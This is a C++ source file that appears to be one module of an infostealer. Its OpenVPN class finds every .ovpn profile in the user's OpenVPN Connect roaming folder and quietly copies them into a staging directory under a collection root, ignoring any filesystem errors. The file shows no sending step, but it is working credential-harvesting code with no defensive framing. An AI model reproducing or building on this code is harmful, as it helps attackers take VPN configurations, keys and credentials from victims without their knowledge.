//
// Created by .1qxz on 08.06.2024.
//

#include "OpenVPN.h"

static const fs::path OPENVPN_PROFILES_PATH = Utils::getRoamingPath() / "OpenVPN Connect" / "profiles";

void OpenVPN::execute(fs::path &root) {
    std::vector<fs::path> paths = OpenVPN::openvpnProfiles();

    if(paths.empty())
        return;

    fs::path dst = root / "OpenVPN";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

std::vector<fs::path> OpenVPN::openvpnProfiles() {
    std::vector<fs::path> paths;
    try
    {
        for (const auto& entry : fs::directory_iterator(OPENVPN_PROFILES_PATH)) {
            const fs::path& item_path = entry.path();

            std::string extension = item_path.extension().string();
            extension.erase(0, 1);

            if(extension != "ovpn")
                continue;

            paths.push_back(item_path);
        }
    }
    catch (const fs::filesystem_error& ignored) {}

    return paths;
}
